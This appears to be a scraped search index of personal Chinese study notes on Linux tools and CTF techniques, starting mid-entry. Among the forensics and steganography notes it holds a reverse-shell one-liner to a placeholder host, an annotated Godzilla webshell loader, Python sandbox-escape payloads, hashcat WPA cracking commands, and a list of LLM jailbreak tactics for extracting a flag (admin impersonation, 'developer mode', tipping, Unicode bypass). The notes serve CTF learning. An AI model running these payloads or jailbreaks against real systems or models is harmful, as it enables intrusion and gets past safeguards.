screen -ls # 列举 # screen 中滑动 ctrl + A, [ # screen 中跳出 ctrl + A, ctrl + D ","date":"2024-10-09","objectID":"/linux_note/:5:9","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"shell 可以用shellcheck命令检查shell脚本错误 基础例子 foo=bar echo $foo # bar 也可在$foo外加入双引号, 效果一致 unset foo # 环境中删除 foo 变量 export PYTHONPATH=\"$DIR:$PYTHONPATH\" exec python \"$DIR/main.py\" \"$@\" # exec 执行命令 函数 # a.sh 文件内容 a() { mkdir -p \"$1\" cd \"$1\" # $1 指第1个参数 } # shell 中定义函数并直接执行 source a.sh a xxx # 执行 a 中定义的函数 基础变量 $(date) # 日期 $0 # 当前脚本名称 $# # 提供的参数数量 $$ # 正在运行命令的PID $@ # 表示所有的参数, 包含$1, $2, ..., 用于遍历 $? # 存储上一条命令的退出状态, 命令执行成功为0, 失败为非0 循环 for file in $@; do grep foobar \"$file\" \u003e /dev/null 2\u003e /dev/null # 在提供的file中寻找字符串foobar # \u003e 标准输出重定向到 /dev/null 丢弃 # 2 \u003e 将标准错误重定向到 /dev/null 丢弃 done 条件 if [[ \"$?\" -ne 0 ]]; then # -ne 不等于 some_commands fi 匹配 xxx* # *匹配任意 xxx? # ?匹配一个字符 xx{1,2} # 自动补充为xx1, xx2, 也可用多个{}做成笛卡尔积 xx{a..c} # 自动补全为xxa, xxb, xxc ","date":"2024-10-09","objectID":"/linux_note/:6:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"vim 格式设置 :set cindent shiftwidth=4 :set tabstop=2 打开两个文件：Vim file1 file2 -O 寄存器 使用\"指定寄存器，包括`a-z`` ``“bdd删除当前行到寄存器b中，:reg a`查看寄存器a内容 复制专用寄存器\"0 宏 用于批处理，录制：q{register}开始录制到寄存器，q结束录制 回放：@{register}回放命令 在命令模式下：:normal @a全选文本内容后执行a寄存器中命令 ","date":"2024-10-09","objectID":"/linux_note/:7:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"Normal 字符前插入：i；字符后插入：a 行首插入：I；行末插入：A 换行插入：o；行上另起一行插入：O 移动：hjkl左下上右，w移动到下一个单词开头，b回到上一个单词开头 撤消：u，取消撤消：ctrl + R 快速回跳到原位：ctrl+o 删除：x删除后一个字符，daw删除一个单词，d和x可搭配数字执行多次：3x or 3daw 查找：/或?进行前向或反向搜索，n/N跳转到下一个或上一个匹配，*或#进行当前单词前向和后向匹配 复制：y，yy复制一行，y2w复制2个单词，剪切：x，粘贴：p 水平移动：0移动到行首第一个字符，$移动到行尾 垂直移动：()句子间移动，{}段落间移动 修改：r替换一个字符，s替换并进入Insert模式，c搭配：ct\"删除\"\"内的内容 行间搜索移动：f{char}移动到char字符上，用;和,搜索下一个和上一个，t{char}移动到char前一个字符，F{char}反过来搜前面的char字符 页面移动：gg/G移动到文件开头/结尾，H/M/L跳转到屏幕开头/中间/结尾；ctrl+u, ctrl+f上下翻页；zz把屏幕置为中间 使用ci加上一个 ' 或 \u003c 或 \" 或 《 都可以删除以此符号包含的文本并进行替换输入 重复之前的操作：. 光标设置 m{a-z} 文件内标记，文件内跳转，设置标记名为a到z中一个 m{A-Z} 标记文件，不同文件间跳转 光标跳转 ``{mark}` 跳转到标记位置 '{mark} 跳转到标记位置所在行的首字母 文本对象操作 [number]\u003ccommand\u003e[text object] number次数 command命令，d删除，c替换，y复制 text object文本对象，w单词，s句子，p段落 可以用a或i加上字符`(, \u003c, {, [, “, ``等选择包括中的内容 # 删除100行后数据 100G dG ","date":"2024-10-09","objectID":"/linux_note/:7:1","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"Command 每行开头加{结尾加}：:%s/^/{/ | s/$/}/ 显示行号：:set nu 全局替换：:% s/被替换单词/替换为的单词/g 替换命令：:[range]s[ubstitute]/{pattern}/{string}/[flags] range：范围，:10,20表示10-20行，%表示全部 pattern：要替换的模式，string替换后文本/为空 flags：g全局，c确认（替换前会进行确认），n报告匹配到的次数而不替换 回到上一个命令：: + Ctrl + P 显示当前文件名：:r! echo % 显示当前全局路径：:r! echo %:p :%!xxd # 查看文件十六进制编码 :%!xxd -r # 返回/取消 跳转到第n行：:n 删除：:1, xxd删除1-xx行，:xx, $d删除xx到最后一行 Buffer切换 :ls列举当前缓冲区 :b n跳转到第n个缓冲区 :bpre :bnext :bfirst :blast :b buffer_name来切换 :e file_name打开新的文件进入缓冲区编辑 Window切换 左右分屏：vs或ctrl + w + v 上下分屏：sp或ctrl + w + s 切换窗口：ctrl + w + w/h/j/k/l 分别为 循环切换，左，下，上，右窗口 标签页tab :tabe file_name新标签页打开文件 ctrl + w + T当前窗口移到新标签页 :tabc关闭当前标签页及其中所有窗口 :tabo只保留活动标签页 :tabn {N}切到N标签页 :tabn切到下一标签页 :tabp切到上一标签页 ","date":"2024-10-09","objectID":"/linux_note/:7:2","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"Visual Normal模式按v进入，V选择行，ctrl+v选择方块 viw：选中当前单词，vaw：选中当前单词及后空格 代码左右移：V \u0026 Shift + \u003c \u003e ","date":"2024-10-09","objectID":"/linux_note/:7:3","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"Insert 删除上一个字符：ctrl+h 删除上一个单词：ctrl+w 删除当前行光标前内容：ctrl+u 跳转到最后一次编辑的地方并进入Insert模式：gi 补全：ctrl + n 和 ctrl + p补全单词，ctrl + n和ctrl + p上下移动选择 ","date":"2024-10-09","objectID":"/linux_note/:7:4","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"Makefile 格式 \\用于将一行分解为多行 # COMMAND 命令生成TARGET, 其依赖于DEPENDEDS, DEPENDEDS改变, TARGET也重新生成, 后续依赖项也可作为TARGET规则嵌套 \u003cTARGET ...\u003e: \u003cDEPENDEDS ...\u003e COMMAND 模式规则 \u003ctargets ...\u003e: \u003ctarget-pattern\u003e: \u003cprereq-patterns ...\u003e # targets: 目标文件 # target-pattern: 目标集模式，%匹配任意文件名 # prereq-patterns: 依赖集模式 $(OBJS):%.o:%.c # 通过命令将.c依赖均生成.o作为OBJS 自动变量 $+ # 所有依赖文件 $@ # 目标文件名 $\u003c # 第一个依赖文件名 $^ # 依赖项中所有不重复文件 $? # 依赖中所有被修改过的文件 $* # 目标文件名(不包含扩展名) $(object) # 使用object对应变量 $(shell pwd) # 获取相对路径 预定义变量 CFLAGS # 编译选项 OBJS # 依赖文件 TARGET # 目标文件 CC # 编译器 RM # 删除 DIRS # 目录 伪目标 .PHONY: all clean # 伪目标, 强制执行 清理：使用make clean clean: @-rm $(DIR_TARGET)* # @:不回显命令; -:忽略错误, 中断执行; *:目录下所有文件 函数 $(wildcard pattern) # 返回满足pattern的文件列表 $(patsubst pattern, replacement, text) # 将text字符串满足pattern的替换为replacement $(foreach var, list, text) # list中逐一取出到var, 执行text表达式 运行 make -j12 # 多线程执行不同构建任务 ","date":"2024-10-09","objectID":"/linux_note/:8:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"GDB 调试代码，加入参数 gdb --args ./a.out xxx1 xxx2 命令 list 1 # 输出第1行开始的源代码 display xx # 每次运行输出xx的值 whatis variable # 查看变量类型 ptype variable # 查看变量类型结构 bt # 调用路径 ","date":"2024-10-09","objectID":"/linux_note/:9:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"分析 寻找命令系统层源码 https://command-not-found.com/网址获取命令所在apt包名 https://packages.ubuntu.com/或https://www.gnu.org/software/中下载包源码 apt source [package_name]方法直接获取打过补丁的方法 ","date":"2024-10-09","objectID":"/linux_note/:10:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"操作 添加用户 sudo useradd -m xx sudo usermod -aG root xx sudo passwd xx sudo usermod -aG sudo xx chsh -s /bin/sh xx ","date":"2024-10-09","objectID":"/linux_note/:11:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes","CTF"],"content":"工具 ","date":"2024-10-09","objectID":"/misc_note/:1:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"pngcheck 目录下CMD调用：pngcheck -v file ","date":"2024-10-09","objectID":"/misc_note/:1:1","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"F5-steganography java Extract ../../Desktop/xxx.jpg -p password ","date":"2024-10-09","objectID":"/misc_note/:1:2","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"aircrack-ng ","date":"2024-10-09","objectID":"/misc_note/:1:3","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"hashcat ./hashcat -m 22000 -a 3 \u003cpath_to_hash_hc22000_file\u003e -1 \u003ccustom_charset\u003e ?1?1?1?1?1?1?1?1 # -m 22000 用于 WPA/WPA2 模式 # -a 3 Brute-Force攻击模式 # -1: 所以使用?1, 每个?1代表一个字符位置 --custom-charset1=abcdefg...也可 ","date":"2024-10-09","objectID":"/misc_note/:1:4","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Stegsolve ","date":"2024-10-09","objectID":"/misc_note/:1:5","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Volatility 取证工具 volatility.exe -f image.vmem imageinfo # 查看镜像的系统信息 获取Win7SP1x64值替换 volatility.exe -f image.vmem --profile=Win7SP1x64 pslist # 查看进程 volatility.exe -f image.vmem --profile=Win7SP1x64 svcscan # 查看服务 volatility.exe -f image.vmem --profile=Win7SP1x64 netscan # 查看网络连接 volatility.exe -f image.vmem --profile=Win7SP1x64 cmdscan # 查看历史cmd命令 volatility.exe -f image.vmem --profile=Win7SP1x64 cmdline # 查看进程命令行参数 volatility.exe -f image.vmem --profile=Win7SP1x64 filescan # 查找所有文件列表 volatility.exe -f image.vmem --profile=Win7SP1x64filescan | findstr \".txt\\|.doc\\|.zip\\|.png\" # 相关信息匹配查询 volatility.exe -f image.vmem --profile=Win7SP1x64 filescan | findstr \"flag\" # 查flag文件 volatility.exe -f image.vmem --profile=Win7SP1x64 privs # 显示进程权限 volatility.exe -f image.vmem --profile=Win7SP1x64 envars # 显示环境变量 volatility -f 1.vmem --profile=Win7SP1x64 hashdump # 查看用户名密码 # 提取文件 -Q 指向内存地址 volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x7a09f20 -D D:/out_put_dir ","date":"2024-10-09","objectID":"/misc_note/:1:6","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"VeraCrypt 当文件是加密卷时，可以通过该软件进行磁盘挂载，查看其中文件【点击磁盘，加载】 ","date":"2024-10-09","objectID":"/misc_note/:1:7","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"binwalk binwalk xx.xx # 分离文件 binwalk -e xx.xx ","date":"2024-10-09","objectID":"/misc_note/:1:8","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"CyberChef 有终端显示为中文的字节可以使用CyberChef查看 ","date":"2024-10-09","objectID":"/misc_note/:1:9","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Wireshark 跟踪流的编号查看是否有可疑数据 选择原始数据另存为，即使包含其他数据也可解压 ","date":"2024-10-09","objectID":"/misc_note/:1:10","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Linux # 反向shell连接-维持权限 bash -i \u003e \u0026 /dev/tcp/x.x.x.x/port 0 \u003e \u00261 # -i 交互式 # \u003e \u0026 将标准输出与标准错误重定向, 通过tcp协议连接到目标地址端口 # 标准输入重定向到标准输出 ","date":"2024-10-09","objectID":"/misc_note/:1:11","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"基础知识 常见文件头 格式 文件头 文件尾 ZIP(zip) 50 4B 03 04 50 4B RAR(rar) 52 61 72 21 JPEG(jpg) FF D8 FF FF D9 PNG(png) 89 50 4E 47 AE 42 60 82 GIF(gif) 47 49 46 38 00 3B TIFF(tif) 49 49 2A 00 Windows Bitmap(bmp) 42 4D AE 0A 0B 7-ZIP(7z) 37 7A BC AF 27 1C avi(RIFF) 52 49 46 46 ","date":"2024-10-09","objectID":"/misc_note/:2:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"音频 wav文件头：52494646E6AD250357415645666D7420 工具: Audacity 调整左右声道，及频谱图等查看 两声道放在不同轨道上：三点 \u003e 分离立体声到单声道 MP3隐写-MP3Stego .\\Decode.exe -P password -X .\\xxx.mp3 # 解密 # 需要进入 MP3Stego_1_1_19\\MP3Stego 目录下 否则报错 # [Frame 0]OpenTable: could not find tables/huffdec # Check local directory './tables/' # Please check huffman table 'huffdec' ","date":"2024-10-09","objectID":"/misc_note/:2:1","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"字符串 乱序字符串思路：计算各字符出现频率排序 e = dict() # 使用字典 e.keys() # 键 sorted_dict = dict(sorted(e.items(), key=lambda item: item[1], reverse=True)) # 排序字典 ","date":"2024-10-09","objectID":"/misc_note/:2:2","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"编码 Base58 核心价值观编码 https://ctf.bugku.com/tool/cvecode网站进行解密 小鹤双拼 xue hui \u003e xt hv brainfuck 在线解码：http://www.hiencode.com/brain.html 只有8个关键字：\u003e \u003c + - . , [ ] ","date":"2024-10-09","objectID":"/misc_note/:2:3","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"二维码 wx直接扫不出时，尝试汉信码【唯一一个全面支持我国汉字信息编码强制性国家标准】，使用https://tuzim.net/hxdecode/在线工具进行识别 或者尝试ZXing码，中间一个三回环正方形，使用https://zxing.org/w/decode.jspx在线识别 ","date":"2024-10-09","objectID":"/misc_note/:2:4","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"图片格式 JPG SOI（文件头）+APP0（图像识别信息）+ DQT（定义量化表）+ SOF0（图像基本信息）+ DHT（定义Huffman表） DRI（定义重新开始间隔）+ SOS（扫描行开始）+ EOI（文件尾） JPEG文件头：ffd8 ffe0 0010 4a46 4946，一般以ÿØÿà..JFIF开头 文件结尾：ffd9 JPG包含JFIF与Exif两种文件结构 更改大小：可以在010editor中查看以下两个选项 PNG 文件头：固定八字节为：89 50 4E 47 0D 0A 1A 0A （固定）四个字节00 00 00 0D（十进制13）代表数据块的长度为13 （固定）四个字节49 48 44 52（ASCII码的IHDR）是文件头数据块的标示（IDCH） PNG文件可以在CyberChef中输入进行异或操作，获取加密后文件 图片宽高修改：010editor中报错 爆破CRC获取正确宽高 import binascii import struct crcbp = open(\"download.png\", \"rb\").read() #打开图片 for i in range(2000): for j in range(2000): data = crcbp[12:16] + \\ # IHDR struct.pack('\u003ei', i) + \\ # 宽 返回字节 \u003e:big-endian, i:int struct.pack('\u003ei', j) + \\ # 高 crcbp[24:29] crc32 = binascii.crc32(data) \u0026 0xffffffff if(crc32 == 0x9a3fc668): #图片当前CRC print(i, j) print('hex:', hex(i), hex(j)) ","date":"2024-10-09","objectID":"/misc_note/:2:5","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"摩尔斯电码 破译网址：https://www.ip138.com/mosi/，可结合长短音，只破译字母和数字，若有其他符号，参考wiki ","date":"2024-10-09","objectID":"/misc_note/:2:6","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"压缩文件 开头一般为：PK.. (50 4B 03 04) import zipfile # python实现解压缩 with zipfile.ZipFile(file_path, 'r') as zip_ref: zip_ref.extractall(output_dir) 压缩文件有密码，内容少的话，可以使用CRC校验值爆破 此处pwd大小为2字节，遍历2个字符与CRC检验码比较 from zlib import crc32 def crc32_f(data): return hex(crc32(data.encode('utf-8'))\u00260xffffffff)[2:10] # 获取值的CRC zip伪加密 zip由三部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 50 4B后一段距离会出现09 00 08 00，压缩源文件目录区中09 00影响加密属性，数字为奇数时为加密，为偶数时不加密 ","date":"2024-10-09","objectID":"/misc_note/:2:7","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"NTFS NTFS 交换数据流隐写 NTFS 交换数据流（Alternate Data Streams，简称 ADS），每个文件都有主文件流和非主文件流 主文件流可直接看到；非主文件流(ADS)寄宿于主文件流中，无法直接读取允许文件携带附加信息 # cmd dir /r # 2024/07/28 20:54 18 flag.txt # 82 flag.txt:hello.txt:$DATA # 1 个文件 18 字节 notepad flag.txt:hello.txt # 查看隐藏文件 ","date":"2024-10-09","objectID":"/misc_note/:2:8","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"3D文件 文件头：67 6c 54 46 glTF 在线查看文件内容：https://products.aspose.app/3d/zh-cn/viewer/gltf ","date":"2024-10-09","objectID":"/misc_note/:2:9","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"二进制文件 尝试cat elf查看是否隐藏信息，可能与执行态无关 ","date":"2024-10-09","objectID":"/misc_note/:2:10","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"流量分析 HTTP：右键 \u003e 追踪流 \u003e HTTP Stream 可以看到完整请求内容 ","date":"2024-10-09","objectID":"/misc_note/:3:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"USB 流量中存有HID data，通过usb.data_len==8过滤流量，选中右键应用为列 文件 \u003e 导出分组解析结果 \u003e As JSON import json # 该字典在https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf keys = {\"5d\":\"5\",\"5e\":\"6\",\"5f\":\"7\"} data = [] with open('a.json', 'r', encoding='utf-8') as f: data = json.load(f) a1 = [] for i in data: try: a1.append(i['_source']['layers']['usbhid.data']) except Exception as e: pass ans = \"\" for x in a1: tmp = x[6:8] # 获取第三个字节 ans+= keys[tmp] print(ans) 处理数据包 实现从 n 个数据包中提取其中包含的JPEG图片 from scapy.all import * # 处理网络数据包 from pwn import u32, u64, u16, u8 # 原始字节数据转换为相应长度的无符号整数 packets = rdpcap('flag.pcapng') # 加载 con = b'' # 数据总和 for pkt in packets: info = pkt.raw_packet_cache # 字节数据 offset_addr = u16(info[:2]) # 2字节: USBPcap pseudoheader length packet_count = u32(info[0x1f:0x1f+4]) # 4字节: Isochronous transfer number of packets packet_lens = [] for i in range(packet_count): # 子包的偏移量 0x27: 第一个子包起始位置, 0xc:每个子包头部长(不包括数据) off = u32(info[0x27+i*0xc:0x27+i*0xc+4]) # 子包中数据长度 packet_len = u32(info[0x27+i*0xc+4:0x27+i*0xc+8]) packet_lens.append((off, packet_len)) for off, packet_len in packet_lens: # 每个JPEG文件字节数据 con += info[offset_addr+off+0xc:offset_addr+off+packet_len] tmp = con.split(b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF') a = 0 for i in tmp: a += 1 with open(f'./imgs/{a}.jpeg', 'wb') as f: f.write(b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF' + i) ","date":"2024-10-09","objectID":"/misc_note/:3:1","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"WIFI 协议**：802.11**，WPA或WEP加密后数据包 # kali $ aircrack-ng xxx.cap # BSSID ESSID Encryption 1 xx:xx:xx:xx:xx:xx XXXXXXX WPA (1 handshake) 无线握手包WIFI密码破解 https://hashcat.net/cap2hashcat/在线将.cap文件转换为.hc22000格式用于hashcat破解密码 ","date":"2024-10-09","objectID":"/misc_note/:3:2","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"哥斯拉 webshell管理工具，生成免杀木马，包括base64以及md5函数等 String xc = \"key\"; String pass = \"password\"; String md5 = md5(pass + xc); class X extends ClassLoader { public X(ClassLoader z) { // JAVA类通过类加载器ClassLoader动态加载到JVM中 super(z); // X类继承父类ClassLoader z的特性 } public Class Q(byte[] cb) { // 接收字节码 // 调用父类的defineClass将字节码转换成定义一个类对象，构造恶意类 return super.defineClass(cb, 0, cb.length); } } // 对字节数组加密或解密 public byte[] x(byte[] s, boolean m) { try { javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\"); // init初始化Cipher对象c, 指定密钥xc, 使用AES, 1加密2解密 c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\")); return c.doFinal(s); // 执行加解密操作 } catch (Exception e) { return null; } } try { byte[] data = base64Decode(request.getParameter(pass)); // base64解码pass data = x(data, false); // 将data解密 if (session.getAttribute(\"payload\") == null) { // 代码第一次运行，创建自定义类加载器实例，data解析为JAVA类，存储到session的payload中 session.setAttribute(\"payload\", new X(this.getClass().getClassLoader()).Q(data)); } else { // data存储在http请求的parameters中 request.setAttribute(\"parameters\", data); // 可写入字节数据的输出流 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream(); // 将session中的payload强制转换为Class类型，调用反射方法实例化对象 Object f = ((Class) session.getAttribute(\"payload\")).newInstance(); f.equals(arrOut); f.equals(pageContext); // 获取响应对象的输出流 response.getWriter().write(md5.substring(0, 16)); f.toString(); // 将流中字节数据转换成字节数组AES加密且base64编码后写入HTTP响应量 response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); response.getWriter().write(md5.substring(16)); } } catch (Exception e) { } ","date":"2024-10-09","objectID":"/misc_note/:3:3","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"图片隐写 ","date":"2024-10-09","objectID":"/misc_note/:4:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"PDF 若PDF图片中有多图层，可现将PDF转为WORD，然后将图片保存载入Stegsolve进行不同图层查看 ","date":"2024-10-09","objectID":"/misc_note/:4:1","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"LSB隐写 Least Significant Bit, PNG图片 png图片存储中，每个颜色表示有8bit，即256种颜色，一共包含256256256=16777216种颜色，人类的眼睛可以区分约1,000万种不同的颜色，剩下无法区分的颜色有6777216 LSB隐写: 修改RGB颜色分量的最低二进制位，即最低有效位（LSB），人类眼睛不会注意到前后变化，且图片携带信息 可以使用Stegsolve来进行提取 ","date":"2024-10-09","objectID":"/misc_note/:4:2","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"IDAT隐写 $ pngcheck -v x.png ... chunk IDAT at offset 0x634d0, length 268: EOF while reading data # IDAT块错误 $ binwalk -e x.png # 提取IDAT块，获取xxx.zlib文件(789C开头) zlib解压——解压结果可能为01串/十六进制数/Base64值，再做相应处理 import zlib import binascii a = \"789c45xxxxx\" re = binascii.unhexlify(a) ans = zlib.decompress(re) print(ans) # b'89504E470D0' 返回十六进制数，CyberChef处理 返回01串，若长度为255，尝试转换为二维码 from PIL import Image MAX = 25 pic = Image.new(\"RGB\",(MAX, MAX)) sttr=\"01\" # 255个 i=0 for y in range (0,MAX): for x in range (0,MAX): if(sttr[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1 pic.show() pic.save(\"flag.png\") ","date":"2024-10-09","objectID":"/misc_note/:4:3","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"文本隐写 txt零宽度隐写 零宽度字符：隐藏、不显示、不可打印，大部分程序和编辑器是看不到这种字符，用于调整字符的显示格式 隐藏：需要被加密的内容转换为二进制（Morse编码），该二进制（Morse编码）将被转换为一系列零宽度字符，即可将零宽度的字符串不可见地插入正常文本中隐藏 https://yuanfux.github.io/zero-width-web/进行加解密，vim可能可以看到零宽度字符 ","date":"2024-10-09","objectID":"/misc_note/:5:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Python逃逸 print(\"\\033c\") # 终端清屏 os库 os.chdir(path) # 切换目录 os.listdir(path) # 列出目录文件 re库 正则表达式 re.match(\"[\\\\\\+]\", code) # [..]匹配括号内任意一个字符, \\\\匹配\\, \\+匹配 + re.search(r'[\"\\'0-8bdhosxy_]|[^\\x00-\\xff]', code) # [] 匹配其中内容中的一个, \\' 转义: ' # ^ 取反 不匹配后面的范围 \\x00-\\xff : ASCII码 即匹配任何非ASCII码值 random库 random.choices(string.ascii_uppercase + string.digits, k=6) # 6位: 大写字母及数字组成 逃逸 dir(__builtins__) # 列出内置命名空间中所有属性和方法 __builtins__.__import__(\"os\").system(\"cat /tmp/.f*\") # 执行命令, *匹配某文件 eval(__import__('os').system('env')) 屏蔽后绕过方法 # 使用每个单词的chr值即ASCII码值 command = \"__import__('os').system('ls')\" exp = \"\" for i in command: exp += f\"chr({ord(i)})+\" print(f\"eval({exp[:-1]})\") # eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41)) 输入限制绕过 if len(code) \u003e 15 # 通过延后输入代码解析 eval(input()) # 使用该命令绕过初始限制 重写eval屏蔽 eval(code, {\"__builtins__\": {\"eval\": lambda *x: print(\"sry, no eval for u\")}}, {}) # eval(code, globals, locals): globals 和 locals 定义了全局和局部命名空间 # {\"__builtins__\": {\"eval\": lambda *x: print(\"sry, no eval for u\")}} 作为全局重写为无论输入什么都只打印 # 绕过 [klass for klass in \"\".__class__.__base__.__subclasses__() if klass.__name__ == \"BuiltinImporter\"][0].load_module(\"builtins\").__import__(\"os\").system(\"ls\") # \"\".__class__: 获取\u003cclass 'str'\u003e # .__base__: 获取基类\u003cclass 'object'\u003e # .__subclasses__(): 返回object类所有子类列表 # 列表推导式筛选出BuiltinImporter的类——用于导入内置模块 # [0]取出第一个元素BuiltinImporter类 # .load_module(\"builtins\"): 加载builtins模块，包含python所有内置对象和函数 # .__import__(\"os\").system(\"ls\") # 执行命令 ","date":"2024-10-09","objectID":"/misc_note/:6:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"密码 凯撒密码 a = \"encrypt_data\" shift = 5 text = \"\" for char in a: if char.isalpha(): shift_base = ord('A') if char.isupper() else ord('a') text += chr((ord(char) - shift_base + shift) % 26 + shift_base) else: text += char print(text) 福尔摩斯跳舞小人加密 佛与论禅 http://hi.pcmoe.net/buddha.html解密 ","date":"2024-10-09","objectID":"/misc_note/:7:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"AI ","date":"2024-10-09","objectID":"/misc_note/:8:0","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"Prompt 模仿admin: xxxx 要求编写代码将flag输出 进入开发者模式 停止扮演 括号逃逸：先输入] ，再输入[ 小费攻击：对回答评分，基于评分给小费 使用+将flag切割：fl+ag 用逗号分隔 换行空一行输入 侧信道一个一个爆破问 绕过 Unicode编码绕过进行越狱，找与对应ASCII码相等的Unicode码 寻找平替在线网站 https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8 https://symbl.cc/cn/ ","date":"2024-10-09","objectID":"/misc_note/:8:1","tags":["misc"],"title":"MISC","uri":"/misc_note/"},{"categories":["Notes","CTF"],"content":"工具 ","date":"2024-10-09","objectID":"/pwn_note/:1:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Docker docker pull xxx/xxx:last # 拉取docker镜像 docker images # 查看镜像 docker rmi \u003cCONTAINER IMAGE ID\u003e # 删除镜像 docker start \u003cCONTAINER ID\u003e # 开启容器 docker stop \u003cCONTAINER ID\u003e # 关闭容器 docker ps -a # 查看容器 docker rm -f \u003cCONTAINER ID\u003e # 删除容器 生成容器 sudo docker run -p 18022:22 -p 18080:80 -i -t author/test:last bash -c '/etc/rc.local; /bin/bash' sudo docker run：运行 Docker 容器。 -p 18022:22：将容器内的 SSH 服务绑定到主机的 18022 端口，以便可以通过 SSH 连接到容器内 -p 18080:80：将容器内的 Web 服务绑定到主机的 18080 端口，以便可以通过 Web 浏览器访问容器内的 Web 应用程序 -i -t：以交互式和伪终端的方式运行容器。 author/test:last：使用 author/test:last 镜像作为容器的基础镜像 bash -c '/etc/rc.local; /bin/bash'：在容器内执行两个命令，分别为执行/etc/rc.local和启动一个交互式的 Bash 终端(/bin/bash) --name：容器命名 docker attach ID # 离开容器，容器停止 docker exec -it ID /bin/bash # 离开容器，容器仍运行 ","date":"2024-10-09","objectID":"/pwn_note/:1:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Pwndocker 使用： docker-compose up -d docker exec -it pwn_test /bin/bash docker 与主机传文件 docker ps -a #查看CONTAINER ID 或 NAMES docker inspect -f '{{.Id}}' NAMES #根据ID或NAMES拿到ID全称 docker cp 本地文件路径 ID全称:容器路径 在自定义 libc 版本中运行 cp 